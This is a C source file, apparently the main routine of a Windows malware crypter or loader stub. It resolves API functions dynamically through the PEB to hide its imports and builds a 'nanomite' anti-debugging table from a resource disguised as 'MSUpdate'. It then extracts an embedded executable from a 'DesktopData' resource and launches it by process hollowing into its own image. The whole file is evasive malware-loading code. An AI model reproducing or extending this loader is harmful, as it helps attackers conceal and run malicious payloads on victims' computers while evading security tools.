#include "cyann.h"
#include "api_function.h"

LPWSTR	get_me(void)
{
	WCHAR			buffer[MAX_PATH];
	LPWSTR			str;
	CINT			size;
	GETMODULEFILENAME	getfn;

	if (!(getfn = (GETMODULEFILENAME)resolve_symbol(&g_fonctions[16])))
		return (NULL);
	if (!(size = getfn(NULL, buffer, MAX_PATH)))
		return (NULL);
	if (!(str = (LPWSTR)malloc(sizeof(WCHAR) * size)))
		return (NULL);
	wcscpy(str, buffer);
	return (str);
}

int main(void)
{
	LPWSTR	memyselfandi;
	//WCHAR resid[128] = L"X32";
	//WCHAR rsrc[128] = L"NM32";
	PUCHAR	bin;
	t_pe	*pe;

	get_peb(&g_peb);
	if (!(memyselfandi = get_me()))
		return (1);
	g_ntable = make_nanomited_table(MSUpdate);
	if (g_ntable)
	{
		if ((bin = extract_rsrc(DesktopData)))
		{
			pe = parse_pe(bin);
			process_hollow(memyselfandi, pe);
			free_pe(pe);
		}
	}
	free(memyselfandi);
	return (0);
}
